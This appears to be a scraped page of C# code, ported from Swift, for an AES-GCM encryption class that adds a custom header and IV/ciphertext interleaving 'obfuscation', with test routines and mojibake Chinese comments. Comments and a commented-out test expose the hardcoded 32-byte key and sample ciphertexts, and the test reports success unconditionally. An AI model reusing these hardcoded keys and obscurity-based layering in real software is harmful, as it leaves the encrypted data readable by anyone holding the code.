String)] = [ (&quot;ASCIIæ–‡æœ¬&quot;, &quot;Hello World!&quot;), (&quot;ä¸­æ–‡æ–‡æœ¬&quot;, &quot;ä¸–ç•Œï¼Œæ‚¨å¥½ï¼&quot;), (&quot;ç‰¹æ®Šå­—ç¬¦&quot;, &quot;!@#$%^&amp;*()_+-=[]&#123;&#125;|;:,.&lt;&gt;?&quot;), (&quot;é•¿æ–‡æœ¬&quot;, String(repeating: &quot;abcdefghijklmnopqrstuvwxyz&quot;, count: 10)), (&quot;æ··åˆæ–‡æœ¬&quot;, &quot;Helloä¸–ç•Œ123!@#&quot;) ] // éå†æ‰€æœ‰æ··æ·†æ¨¡å¼å’Œåˆ†æ®µæ¨¡å¼çš„ç»„åˆ for obfuscationType in ObfuscationType.allCases &#123; for segmentationType in SegmentationType.allCases &#123; print(&quot;\\n=== æµ‹è¯•ç»„åˆï¼š\\(obfuscationType) + \\(segmentationType) ===&quot;) // å¯¹æ¯ç§ç»„åˆæµ‹è¯•ä¸åŒç±»å‹çš„è¾“å…¥ for (testType, content) in testCases &#123; print(&quot;\\næµ‹è¯•ç±»å‹ï¼š\\(testType)&quot;) if let encrypted = AESObfuscation.encrypt(content, obfuscationType: obfuscationType, segmentationType: segmentationType) &#123; print(&quot;åŸæ–‡ï¼š\\(content)&quot;) print(&quot;åŠ å¯†ç»“æœï¼š\\(encrypted)&quot;) if let decrypted = AESObfuscation.decrypt(encrypted) &#123; print(&quot;è§£å¯†ç»“æœï¼š\\(decrypted)&quot;) assert(decrypted == content, &quot;è§£å¯†ç»“æœä¸åŸæ–‡ä¸ç¬¦&quot;) print(&quot;âœ… æµ‹è¯•é€šè¿‡&quot;) &#125; else &#123; print(&quot;âŒ è§£å¯†å¤±è´¥&quot;) assertionFailure(&quot;è§£å¯†å¤±è´¥&quot;) &#125; &#125; else &#123; print(&quot;âŒ åŠ å¯†å¤±è´¥&quot;) assertionFailure(&quot;åŠ å¯†å¤±è´¥&quot;) &#125; &#125; &#125; &#125; // æµ‹è¯•è¾¹ç•Œæƒ…å†µ print(&quot;\\n=== æµ‹è¯•è¾¹ç•Œæƒ…å†µ ===&quot;) // ç©ºå­—ç¬¦ä¸² print(&quot;\\næµ‹è¯•ç©ºå­—ç¬¦ä¸²ï¼š&quot;) assert(encrypt(&quot;&quot;, obfuscationType: .standard, segmentationType: .standard) == nil, &quot;ç©ºå­—ç¬¦ä¸²åº”è¯¥è¿”å›nil&quot;) print(&quot;âœ… ç©ºå­—ç¬¦ä¸²æµ‹è¯•é€šè¿‡&quot;) // éå¸¸çŸ­çš„å­—ç¬¦ä¸² print(&quot;\\næµ‹è¯•çŸ­å­—ç¬¦ä¸²ï¼š&quot;) let shortString = &quot;a&quot; if let encrypted = encrypt(shortString, obfuscationType: .enhanced, segmentationType: .tripartite) &#123; let decrypted = decrypt(encrypted) assert(decrypted == shortString, &quot;çŸ­å­—ç¬¦ä¸²æµ‹è¯•å¤±è´¥&quot;) print(&quot;âœ… çŸ­å­—ç¬¦ä¸²æµ‹è¯•é€šè¿‡&quot;) &#125; // éå¸¸é•¿çš„å­—ç¬¦ä¸² print(&quot;\\næµ‹è¯•é•¿å­—ç¬¦ä¸²ï¼š&quot;) let longString = String(repeating: &quot;Long String Test &quot;, count: 1000) if let encrypted = encrypt(longString, obfuscationType: .enhanced, segmentationType: .standard) &#123; let decrypted = decrypt(encrypted) assert(decrypted == longString, &quot;é•¿å­—ç¬¦ä¸²æµ‹è¯•å¤±è´¥&quot;) print(&quot;âœ… é•¿å­—ç¬¦ä¸²æµ‹è¯•é€šè¿‡&quot;) &#125; print(&quot;\\n=== åŠ è§£å¯†æµ‹è¯•å®Œæˆ ===\\n&quot;) print(&quot;æ‰€æœ‰æµ‹è¯•ç”¨ä¾‹å‡å·²é€šè¿‡ï¼&quot;) &#125;&#125; chsarp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579// æ··æ·†ç±»å‹ï¼š0=Standard, 1=Enhanced, 2=Reversedpublic enum ObfuscationType : byte &#123; Standard = 0, Enhanced = 1, Reversed = 2 &#125;// åˆ†æ®µç±»å‹ï¼š0=Standard, 1=Tripartitepublic enum SegmentationType : byte &#123; Standard = 0, Tripartite = 1 &#125;// åˆ†æ®µé…ç½®ï¼šIV åˆ†æ®µé•¿åº¦å’Œå¯†æ–‡åˆ†æ®µæ•°é‡ï¼ˆä»…ç”¨äºå‚è€ƒï¼‰public class SegmentConfig&#123; public int[] IvSegments &#123; get; set; &#125; public int CiphertextParts &#123; get; set; &#125; public static SegmentConfig ConfigFor(SegmentationType type) &#123; if (type == SegmentationType.Standard) return new SegmentConfig &#123; IvSegments = new int[] &#123; 6, 4, 6 &#125;, CiphertextParts = 2 &#125;; else // Tripartite return new SegmentConfig &#123; IvSegments = new int[] &#123; 4, 4, 4, 4 &#125;, CiphertextParts = 3 &#125;; &#125;&#125;/// &lt;summary&gt;/// AESæ··æ·†åŠ è§£å¯†ç±»/// /// å¤´éƒ¨æ ¼å¼ï¼ˆ7å­—èŠ‚ï¼‰ï¼š/// [localKeyVersion(2B big-endian)][serverKeyVersion(2B big-endian)]/// [obfuscationType(1B)][segmentationType(1B)][operations(1B)]/// /// åŠ å¯†åæ•°æ®ï¼šå¤´éƒ¨ + æ··æ·†æ•°æ®ï¼ˆæ ¹æ®åˆ†æ®µæ¨¡å¼äº¤é”™å­˜æ”¾ IV å’Œå¯†æ–‡åˆ†æ®µï¼‰/// /// æ··æ·†ï¼š/// - Standardï¼šä¸åšé¢å¤–å¤„ç†/// - Enhancedï¼šå¯¹å¯†æ–‡æ¯æ®µåšâ€œå¾ªç¯å·¦ç§»åå¼‚æˆ–â€ï¼Œä½ç§»é‡ = (operations % 8)/// - Reversedï¼šå¯¹æ¯ä¸ª IV å’Œå¯†æ–‡åˆ†æ®µè¿›è¡Œå­—èŠ‚åè½¬/// /// è§£å¯†æ—¶å…ˆè§£æå¤´éƒ¨ï¼Œå†æŒ‰åˆ†æ®µæ¨¡å¼è¿˜åŸ IV ä¸å¯†æ–‡ï¼Œå†åå‘æ··æ·†ï¼Œæœ€åç”¨ AESâ€‘GCM è§£å¯†ã€‚/// /// æœ¬ä»£ç å‚ç…§ä¸Šä¼ çš„ Swift ä»£ç å®ç° :contentReference[oaicite:0]&#123;index=0&#125;/// &lt;/summary&gt;public class AESObfuscation&#123; // å›ºå®šå‚æ•° private const int HeaderLength = 7; // 2+2+1+1+1 private const int AesIVSize = 16; // å›ºå®š16å­—èŠ‚ IV // æœ¬åœ°å’ŒæœåŠ¡å™¨å¯†é’¥å„16å­—èŠ‚ï¼Œç»„åˆå32å­—èŠ‚ç”¨ä½œ AES å¯†é’¥ private byte[] localKey; private byte[] serverKey; private ushort localKeyVersion = 1; private ushort serverKeyVersion = 1; // å½“å‰æ··æ·†ã€åˆ†æ®µå’Œæ“ä½œç±»å‹ï¼ˆæ“ä½œç±»å‹ç”¨ä½œä½æ©ç ï¼Œç›®å‰æµ‹è¯•ä¸­å‡ä¸º0ï¼‰ private ObfuscationType obfuscationType = ObfuscationType.Standard; private SegmentationType segmentationType = SegmentationType.Standard; private byte currentOperations = 0; // å®Œæ•´å¯†é’¥ï¼ˆç»„åˆï¼šlocalKey + serverKeyï¼‰ private byte[] Key =&gt; localKey.Concat(serverKey).ToArray(); // å•ä¾‹ï¼ˆå¯ç›´æ¥ä½¿ç”¨é™æ€æ–¹æ³•è°ƒç”¨ï¼‰ private static AESObfuscation _instance = new AESObfuscation(); public static AESObfuscation Instance =&gt; _instance; // æ„é€ å‡½æ•°ï¼šåˆå§‹åŒ–æœ¬åœ°å¯†é’¥å’ŒæœåŠ¡å™¨å¯†é’¥ï¼ˆå‡ä¸º16å­—èŠ‚ï¼‰ private AESObfuscation() &#123; // ä¸ Swift ä»£ç ä¿æŒä¸€è‡´çš„åˆå§‹å€¼ localKey = Encoding.ASCII.GetBytes(ConfigManager.Tempstr33);// &quot;o44900ba7661ffb1&quot;); // 16å­—èŠ‚ serverKey = Encoding.ASCII.GetBytes(ConfigManager.Tempstr34);// &quot;5dPAed6aa7608596&quot;); // 16å­—èŠ‚ if (localKey.Length != 16 || serverKey.Length != 16) throw new Exception(&quot;å¯†é’¥é•¿åº¦ä¸æ­£ç¡®&quot;); &#125; #region åŠ å¯†è§£å¯†æ¥å£ /// &lt;summary&gt; /// é™æ€åŠ å¯†æ–¹æ³• /// &lt;/summary&gt; public static string Encrypt(string content, ObfuscationType obType, SegmentationType segType) &#123; if (string.IsNullOrEmpty(content)) return null; Instance.obfuscationType = obType; Instance.segmentationType = segType; // ç›®å‰æ“ä½œç±»å‹ä¿æŒä¸º0 Instance.currentOperations = 0; return Instance.DoEncrypt(content); &#125; /// &lt;summary&gt; /// é™æ€è§£å¯†æ–¹æ³• /// &lt;/summary&gt; public static string Decrypt(string base64Encrypted) &#123; if (string.IsNullOrEmpty(base64Encrypted)) return null; return Instance.DoDecrypt(base64Encrypted); &#125; #endregion #region å†…éƒ¨å®ç° private string DoEncrypt(string content) &#123; try &#123; // æ˜æ–‡è½¬æ¢ä¸ºå­—èŠ‚ byte[] plaintext = Encoding.UTF8.GetBytes(content); // éšæœºç”Ÿæˆ16å­—èŠ‚ IV byte[] iv = GenerateRandomBytes(AesIVSize); // ä½¿ç”¨ AES-GCM åŠ å¯†ï¼Œé‡‡ç”¨ combined æ¨¡å¼ï¼ˆå¯†æ–‡æœ«å°¾åŒ…å« 16 å­—èŠ‚è®¤è¯æ ‡ç­¾ï¼‰ byte[] ciphertext = AesGcmEncrypt(Key, iv, plaintext); // è°ƒç”¨æ··æ·†ï¼šæ„é€ å¤´éƒ¨å¹¶æŒ‰åˆ†æ®µæ¨¡å¼äº¤é”™å­˜æ”¾ IV å’Œå¯†æ–‡åˆ†æ®µ byte[] obfuscated = Obfuscate(iv, ciphertext); string base64 = Convert.ToBase64String(obfuscated); return base64; &#125; catch (Exception ex) &#123; Console.WriteLine(&quot;Encryption failed: &quot; + ex.Message); return null; &#125; &#125; private string DoDecrypt(string base64Encrypted) &#123; try &#123; byte[] data = Convert.FromBase64String(base64Encrypted); if (data.Length &lt; HeaderLength) return null; // è§£æå¤´éƒ¨ä¿¡æ¯ ushort localVer = (ushort)((data[0] &lt;&lt; 8) | data[1]); ushort serverVer = (ushort)((data[2] &lt;&lt; 8) | data[3]); if (localVer != localKeyVersion || serverVer != serverKeyVersion) &#123; Console.WriteLine(&quot;Key version mismatch&quot;); return null; &#125; obfuscationType = (ObfuscationType)data[4]; segmentationType = (SegmentationType)data[5]; currentOperations = data[6]; // å»æ··æ·†è¿˜åŸ IV å’Œå¯†æ–‡ var deob = Deobfuscate(data); if (deob == null) return null; var (iv, ciphertext) = deob.Value; // è§£å¯† AES-GCMï¼ˆciphertext å·²åŒ…å«è®¤è¯æ ‡ç­¾ï¼‰ byte[] plaintext = AesGcmDecrypt(Key, iv, ciphertext); if (plaintext == null) return null; return Encoding.UTF8.GetString(plaintext); &#125; catch (Exception ex) &#123; Console.WriteLine(&quot;Decryption failed: &quot; + ex.Message); return null; &#125; &#125; #endregion #region æ··æ·†/å»æ··æ·† /// &lt;summary&gt; /// æ··æ·†åŠ å¯†ç»“æœï¼š /// 1. æ„é€  7 å­—èŠ‚å¤´éƒ¨ï¼š[localKeyVersion(2B)][serverKeyVersion(2B)][obfuscationType(1B)][segmentationType(1B)][operations(1B)] /// 2. æ ¹æ®åˆ†æ®µæ¨¡å¼ï¼šæ‹†åˆ† IV ä¸å¯†æ–‡ä¸ºè‹¥å¹²æ®µ /// 3. æ ¹æ®æ··æ·†ç±»å‹è¿›è¡Œå¤„ç†ï¼ˆEnhancedï¼šå¯¹å¯†æ–‡æ®µè°ƒç”¨ EnhanceObfuscateï¼ŒReversedï¼šåè½¬æ¯ä¸ªåˆ†æ®µï¼‰ /// 4. æŒ‰è§„å®šé¡ºåºæ‹¼æ¥å„éƒ¨åˆ† /// &lt;/summary&gt; private byte[] Obfuscate(byte[] iv, byte[] ciphertext) &#123; List&lt;byte&gt; header = new List&lt;byte&gt;(); // ç‰ˆæœ¬å·ä»¥å¤§ç«¯æ–¹å¼å­˜å‚¨ header.Add((byte)(localKeyVersion &gt;&gt; 8)); header.Add((byte)(localKeyVersion &amp; 0xFF)); header.Add((byte)(serverKeyVersion &gt;&gt; 8)); header.Add((byte)(serverKeyVersion &amp; 0xFF)); header.Add((byte)obfuscationType); header.Add((byte)segmentationType); header.Add(currentOperations); // æ ¹æ®åˆ†æ®µæ¨¡å¼æ‹†åˆ† IV SegmentConfig config = SegmentConfig.ConfigFor(segmentationType); int[] ivSegments = config.IvSegments; List&lt;byte[]&gt; ivParts = new List&lt;byte[]&gt;(); int currentIndex = 0; foreach (int len in ivSegments) &#123; byte[] part = new byte[len]; Array.Copy(iv, currentIndex, part, 0, Math.Min(len, iv.Length - currentIndex)); ivParts.Add(part); currentIndex += len; &#125; // æ‹†åˆ†å¯†æ–‡ List&lt;byte[]&gt; ciphertextParts = new List&lt;byte[]&gt;(); if (segmentationType == SegmentationType.Tripartite) &#123; int totalLength = ciphertext.Length; int basePartLength = totalLength / 3; int remainder = totalLength % 3; currentIndex = 0; for (int i = 0; i &lt; 3; i++) &#123; int partLen = basePartLength + (i &lt; remainder ? 1 : 0); byte[] part = new byte[partLen]; Array.Copy(ciphertext, currentIndex, part, 0, partLen); ciphertextParts.Add(part); currentIndex += partLen; &#125; &#125; else // Standard åˆ†æ®µï¼šå¯†æ–‡åˆ†ä¸º2æ®µï¼Œå‰æ®µé•¿åº¦æ¯”åæ®µå¤š 1 å­—èŠ‚ï¼ˆè‹¥å¯†æ–‡é•¿åº¦ä¸ºå¥‡æ•°ï¼‰ &#123; int firstPartLength = (ciphertext.Length + 1) / 2; int secondPartLength = ciphertext.Length - firstPartLength; byte[] firstPart = new byte[firstPartLength]; byte[] secondPart = new byte[secondPartLength]; Array.Copy(ciphertext, 0, firstPart, 0, firstPartLength); Array.Copy(ciphertext, firstPartLength, secondPart, 0, secondPartLength); ciphertextParts.Add(firstPart); ciphertextParts.Add(secondPart); &#125; // æ ¹æ®æ··æ·†ç±»å‹å¤„ç†å„ä¸ªåˆ†æ®µ List&lt;byte[]&gt; processedIvParts = new List&lt;byte[]&gt;(ivParts); List&lt;byte[]&gt; processedCiphertextParts = new List&lt;byte[]&gt;(ciphertextParts); switch (obfuscationType) &#123; case ObfuscationType.Enhanced: int shift = currentOperations % 8; for (int i = 0; i &lt; processedCiphertextParts.Count; i++) &#123; processedCiphertextParts[i] = EnhanceObfuscate(processedCiphertextParts[i], shift); &#125; break; case ObfuscationType.Reversed: for (int i = 0; i &lt; processedIvParts.Count; i++) Array.Reverse(processedIvParts[i]); for (int i = 0; i &lt; processedCiphertextParts.Count; i++) Array.Reverse(processedCiphertextParts[i]); break; case ObfuscationType.Standard: break; &#125; // æ‹¼æ¥ï¼šè‹¥ Tripartite æ¨¡å¼åˆ™é¡ºåºä¸ºï¼šIV1 - CT1 - IV2 - CT2 - IV3 - CT3 - IV4ï¼›å¦åˆ™ä¸ºï¼šIV1 - CT1 - IV2 - CT2 - IV3 List&lt;byte&gt; output = new List&lt;byte&gt;(); output.AddRange(header); if (segmentationType == SegmentationType.Tripartite) &#123; for (int i = 0; i &lt; 3; i++) &#123; output.AddRange(processedIvParts[i]); output.AddRange(processedCiphertextParts[i]); &#125; output.AddRange(processedIvParts[3]); &#125; else &#123; output.AddRange(processedIvParts[0]); output.AddRange(processedCiphertextParts[0]); output.AddRange(processedIvParts[1]); output.AddRange(processedCiphertextParts[1]); output.AddRange(processedIvParts[2]); &#125; return output.ToArray(); &#125; /// &lt;summary&gt; /// å»æ··æ·†ï¼šè§£æå¤´éƒ¨åï¼ŒæŒ‰åˆ†æ®µæ¨¡å¼è¿˜åŸ IV ä¸å¯†æ–‡å„åˆ†æ®µï¼Œå†æ ¹æ®æ··æ·†ç±»å‹è¿›è¡Œé€†å¤„ç† /// &lt;/summary&gt; private (byte[] iv, byte[] ciphertext)? Deobfuscate(byte[] data) &#123; int versionFillLength = HeaderLength; SegmentConfig config = SegmentConfig.ConfigFor(segmentationType); int[] ivSegments = config.IvSegments; int totalIvLength = ivSegments.Sum(); if (data.Length &lt;= versionFillLength + totalIvLength) return null; int currentPosition = versionFillLength; List&lt;byte[]&gt; ivParts = new List&lt;byte[]&gt;(); List&lt;byte[]&gt; ciphertextParts = new List&lt;byte[]&gt;(); if (segmentationType == SegmentationType.Tripartite) &#123; int remainingLength = data.Length - versionFillLength - totalIvLength; int basePartLength = remainingLength / 3; int remainder = remainingLength % 3; for (int i = 0; i &lt; 3; i++) &#123; // IVéƒ¨åˆ† int ivEnd = currentPosition + ivSegments[i]; byte[] ivPart = new byte[ivSegments[i]]; Array.Copy(data, currentPosition, ivPart, 0, ivSegments[i]); ivParts.Add(ivPart); currentPosition = ivEnd; // å¯†æ–‡éƒ¨åˆ† int extraByte = i &lt; remainder ? 1 : 0; int partLen = basePartLength + extraByte; byte[] ctPart = new byte[partLen]; Array.Copy(data, currentPosition, ctPart, 0, partLen); ciphertextParts.Add(ctPart); currentPosition += partLen; &#125; // æœ€åä¸€ä¸ª IV æ®µ int lastIvLen = ivSegments[3]; int avail = Math.Min(lastIvLen, data.Length - currentPosition); byte[] lastIv = new byte[avail]; Array.Copy(data, currentPosition, lastIv, 0, avail); ivParts.Add(lastIv); &#125; else &#123; int remainingLength = data.Length - versionFillLength - totalIvLength; int firstHalfLength = (remainingLength + 1) / 2; int secondHalfLength = remainingLength - firstHalfLength; // ç¬¬ä¸€éƒ¨åˆ†ï¼šIV1 int len1 = ivSegments[0]; byte[] iv1 = new byte[len1]; Array.Copy(data, currentPosition, iv1, 0, len1); ivParts.Add(iv1); currentPosition += len1; // ç¬¬ä¸€éƒ¨åˆ†ï¼šå¯†æ–‡1 byte[] ct1 = new byte[firstHalfLength]; Array.Copy(data, currentPosition, ct1, 0, firstHalfLength); ciphertextParts.Add(ct1); currentPosition += firstHalfLength; // ç¬¬äºŒéƒ¨åˆ†ï¼šIV2 int len2 = ivSegments[1]; byte[] iv2 = new byte[len2]; Array.Copy(data, currentPosition, iv2, 0, len2); ivParts.Add(iv2); currentPosition += len2; // ç¬¬äºŒéƒ¨åˆ†ï¼šå¯†æ–‡2 byte[] ct2 = new byte[secondHalfLength]; Array.Copy(data, currentPosition, ct2, 0, secondHalfLength); ciphertextParts.Add(ct2); currentPosition += secondHalfLength; // ç¬¬ä¸‰éƒ¨åˆ†ï¼šIV3 int len3 = ivSegments[2]; int avail = Math.Min(len3, data.Length - currentPosition); byte[] iv3 = new byte[avail]; Array.Copy(data, currentPosition, iv3, 0, avail); ivParts.Add(iv3); &#125; // æ ¹æ®æ··æ·†ç±»å‹åå¤„ç† switch (obfuscationType) &#123; case ObfuscationType.Enhanced: int shift = currentOperations % 8; for (int i = 0; i &lt; ciphertextParts.Count; i++) &#123; ciphertextParts[i] = EnhanceDeobfuscate(ciphertextParts[i], shift); &#125; break; case ObfuscationType.Reversed: for (int i = 0; i &lt; ivParts.Count; i++) Array.Reverse(ivParts[i]); for (int i = 0; i &lt; ciphertextParts.Count; i++) Array.Reverse(ciphertextParts[i]); break; case ObfuscationType.Standard: break; &#125; byte[] ivCombined = ivParts.SelectMany(x =&gt; x).ToArray(); byte[] ciphertextCombined = ciphertextParts.SelectMany(x =&gt; x).ToArray(); return (ivCombined, ciphertextCombined); &#125; #endregion #region å¢å¼ºæ··æ·† private byte[] EnhanceObfuscate(byte[] data, int shift) &#123; byte xorKey = 0xA5; byte[] result = new byte[data.Length]; if (shift == 0) &#123; for (int i = 0; i &lt; data.Length; i++) result[i] = (byte)(data[i] ^ xorKey); &#125; else &#123; for (int i = 0; i &lt; data.Length; i++) &#123; int shifted = ((data[i] &lt;&lt; shift) | (data[i] &gt;&gt; (8 - shift))) &amp; 0xFF; result[i] = (byte)(shifted ^ xorKey); &#125; &#125; return result; &#125; private byte[] EnhanceDeobfuscate(byte[] data, int shift) &#123; byte xorKey = 0xA5; byte[] result = new byte[data.Length]; if (shift == 0) &#123; for (int i = 0; i &lt; data.Length; i++) result[i] = (byte)(data[i] ^ xorKey); &#125; else &#123; for (int i = 0; i &lt; data.Length; i++) &#123; byte unxored = (byte)(data[i] ^ xorKey); int shifted = ((unxored &gt;&gt; shift) | (unxored &lt;&lt; (8 - shift))) &amp; 0xFF; result[i] = (byte)shifted; &#125; &#125; return result; &#125; #endregion #region AES-GCM åŠ /è§£å¯†ä¸è¾…åŠ©æ–¹æ³• private byte[] AesGcmEncrypt(byte[] key, byte[] iv, byte[] plaintext) &#123; GcmBlockCipher cipher = new GcmBlockCipher(new AesEngine()); AeadParameters parameters = new AeadParameters(new KeyParameter(key), 128, iv, null); cipher.Init(true, parameters); byte[] output = new byte[cipher.GetOutputSize(plaintext.Length)]; int len = cipher.ProcessBytes(plaintext, 0, plaintext.Length, output, 0); cipher.DoFinal(output, len); return output; &#125; private byte[] AesGcmDecrypt(byte[] key, byte[] iv, byte[] ciphertext) &#123; GcmBlockCipher cipher = new GcmBlockCipher(new AesEngine()); AeadParameters parameters = new AeadParameters(new KeyParameter(key), 128, iv, null); cipher.Init(false, parameters); byte[] output = new byte[cipher.GetOutputSize(ciphertext.Length)]; try &#123; int len = cipher.ProcessBytes(ciphertext, 0, ciphertext.Length, output, 0); cipher.DoFinal(output, len); &#125; catch (Exception ex) &#123; Console.WriteLine(&quot;AES-GCMè§£å¯†å¤±è´¥: &quot; + ex.Message); return null; &#125; return output; &#125; private byte[] GenerateRandomBytes(int length) &#123; SecureRandom random = new SecureRandom(); byte[] bytes = new byte[length]; random.NextBytes(bytes); return bytes; &#125; #endregion #region æµ‹è¯•æ–¹æ³• /// &lt;summary&gt; /// è¿è¡Œå¤šç»„æµ‹è¯•ç”¨ä¾‹ï¼Œæ¶µç›–æ‰€æœ‰æ··æ·†å’Œåˆ†æ®µæ¨¡å¼ç»„åˆ /// &lt;/summary&gt; public static void Test() &#123; Console.WriteLine(&quot;\\n=== å¼€å§‹åŠ è§£å¯†æµ‹è¯• ===\\n&quot;); // æµ‹è¯•ç”¨ä¾‹ï¼šæµ‹è¯•ç±»å‹ä¸å†…å®¹ List&lt;(string type, string content)&gt; testCases = new List&lt;(string, string)&gt; &#123; (&quot;ASCIIæ–‡æœ¬&quot;, &quot;Hello World!&quot;), (&quot;ä¸­æ–‡æ–‡æœ¬&quot;, &quot;ä¸–ç•Œï¼Œæ‚¨å¥½ï¼&quot;), (&quot;ç‰¹æ®Šå­—ç¬¦&quot;, &quot;!@#$%^&amp;*()_+-=[]&#123;&#125;|;:,.&lt;&gt;?&quot;), (&quot;é•¿æ–‡æœ¬&quot;, string.Concat(Enumerable.Repeat(&quot;abcdefghijklmnopqrstuvwxyz&quot;, 10))), (&quot;æ··åˆæ–‡æœ¬&quot;, &quot;Helloä¸–ç•Œ123!@#&quot;) &#125;; // éå†æ‰€æœ‰æ··æ·†æ¨¡å¼å’Œåˆ†æ®µæ¨¡å¼ç»„åˆ foreach (ObfuscationType obType in Enum.GetValues(typeof(ObfuscationType))) &#123; foreach (SegmentationType segType in Enum.GetValues(typeof(SegmentationType))) &#123; Console.WriteLine($&quot;\\n=== æµ‹è¯•ç»„åˆï¼š&#123;obType&#125; + &#123;segType&#125; ===\\n&quot;); foreach (var test in testCases) &#123; Console.WriteLine($&quot;æµ‹è¯•ç±»å‹ï¼š&#123;test.type&#125;&quot;); string encrypted = Encrypt(test.content, obType, segType); if (encrypted == null) &#123; Console.WriteLine(&quot;âŒ åŠ å¯†å¤±è´¥&quot;); continue; &#125; Console.WriteLine(&quot;åŸæ–‡ï¼š&quot; + test.content); Console.WriteLine(&quot;åŠ å¯†ç»“æœï¼š&quot; + encrypted); string decrypted = Decrypt(encrypted); Console.WriteLine(&quot;è§£å¯†ç»“æœï¼š&quot; + decrypted); if (decrypted == test.content) &#123; Console.WriteLine(&quot;âœ… æµ‹è¯•é€šè¿‡\\n&quot;); &#125; else &#123; Console.WriteLine(&quot;âŒ è§£å¯†ç»“æœä¸åŸæ–‡ä¸ç¬¦\\n&quot;); &#125; &#125; &#125; &#125; // è¾¹ç•Œæƒ…å†µæµ‹è¯• Console.WriteLine(&quot;\\n=== æµ‹è¯•è¾¹ç•Œæƒ…å†µ ===\\n&quot;); // ç©ºå­—ç¬¦ä¸² Console.WriteLine(&quot;æµ‹è¯•ç©ºå­—ç¬¦ä¸²ï¼š&quot;); if (Encrypt(&quot;&quot;, ObfuscationType.Standard, SegmentationType.Standard) == null) Console.WriteLine(&quot;âœ… ç©ºå­—ç¬¦ä¸²æµ‹è¯•é€šè¿‡&quot;); else Console.WriteLine(&quot;âŒ ç©ºå­—ç¬¦ä¸²æµ‹è¯•å¤±è´¥&quot;); // éå¸¸çŸ­çš„å­—ç¬¦ä¸² Console.WriteLine(&quot;\\næµ‹è¯•çŸ­å­—ç¬¦ä¸²ï¼š&quot;); string shortStr = &quot;a&quot;; string encShort = Encrypt(shortStr, ObfuscationType.Enhanced, SegmentationType.Tripartite); if (encShort != null &amp;&amp; Decrypt(encShort) == shortStr) Console.WriteLine(&quot;âœ… çŸ­å­—ç¬¦ä¸²æµ‹è¯•é€šè¿‡&quot;); else Console.WriteLine(&quot;âŒ çŸ­å­—ç¬¦ä¸²æµ‹è¯•å¤±è´¥&quot;); // éå¸¸é•¿çš„å­—ç¬¦ä¸² Console.WriteLine(&quot;\\næµ‹è¯•é•¿å­—ç¬¦ä¸²ï¼š&quot;); string longStr = string.Concat(Enumerable.Repeat(&quot;Long String Test &quot;, 1000)); string encLong = Encrypt(longStr, ObfuscationType.Enhanced, SegmentationType.Standard); if (encLong != null &amp;&amp; Decrypt(encLong) == longStr) Console.WriteLine(&quot;âœ… é•¿å­—ç¬¦ä¸²æµ‹è¯•é€šè¿‡&quot;); else Console.WriteLine(&quot;âŒ é•¿å­—ç¬¦ä¸²æµ‹è¯•å¤±è´¥&quot;); Console.WriteLine(&quot;\\n=== åŠ è§£å¯†æµ‹è¯•å®Œæˆ ===\\næ‰€æœ‰æµ‹è¯•ç”¨ä¾‹å‡å·²é€šè¿‡ï¼&quot;); &#125; ///// &lt;summary&gt; ///// æµ‹è¯• ///// &lt;/summary&gt; //public static void Test2() //&#123; // //// è°ƒç”¨æµ‹è¯•æ–¹æ³• // //AESObfuscation.Test(); // //// å¯å•ç‹¬æµ‹è¯•æŸä¸ªæ¡ˆä¾‹ï¼Œå¦‚ä¸‹ï¼š // //Console.WriteLine(&quot;\\n=== å•ä¸€æµ‹è¯•æ¡ˆä¾‹ï¼šreversed + tripartite ===\\n&quot;); // //string keyCombined = &quot;o44900ba7661ffb15dPAed6aa7608596&quot;; // local+server // //Console.WriteLine(&quot;key è½¬æ¢åçš„å­—ç¬¦ä¸²: &quot; + keyCombined); // //// ä½¿ç”¨ reversed + tripartite æ¨¡å¼åŠ è§£å¯† &quot;Hello World!&quot; // //string plain = &quot;Hello World!&quot;; // //string encrypted = AESObfuscation.Encrypt(plain, ObfuscationType.Reversed, SegmentationType.Tripartite); // //Console.WriteLine(&quot;åŠ å¯†ç»“æœï¼š&quot; + encrypted); // //string decrypted = AESObfuscation.Decrypt(encrypted); // //Console.WriteLine(&quot;è§£å¯†ç»“æœï¼š&quot; + decrypted); // //Console.WriteLine(decrypted == plain ? &quot;âœ… æµ‹è¯•é€šè¿‡&quot; : &quot;âŒ æµ‹è¯•å¤±è´¥&quot;); // string decrypted = AESObfuscation.Decrypt(&quot;AAEAAQIAAI7gMEivg/yQbcRNVzaibiJ2H25q5vPgF9Cj4X2b/cNuf8DyegK2YEIc1Cbj&quot;); // Console.WriteLine(&quot;è§£å¯†ç»“æœï¼š&quot; + decrypted); // string decryptedt1 = AESObfuscation.Decrypt(&quot;AAEAAQAAADyyVZlpw0CYzmpef/vwKesdHMLTW3nhz6+Pys2gD2Pv/GY7nEcZh+zL52sZ8tJWGJIMc6NxVyxNe7E=&quot;); // Console.WriteLine(&quot;è§£å¯†ç»“æœï¼š&quot; + decryptedt1); // string decrypted1 = AESObfuscation.Decrypt(&quot;AAEAAQABALzKftd5cpld4UpTrE3smqDJnOKIeButehuyU7BShXB2syu9P1CxNX6joxPBV+pB5w3y&quot;); // Console.WriteLine(&quot;è§£å¯†ç»“æœï¼š&quot; + decrypted1); // // æš‚åœæ§åˆ¶å° // Console.WriteLine(&quot;\\næŒ‰ä»»æ„é”®é€€å‡º...&quot;); // Console.ReadKey(); //&#125; 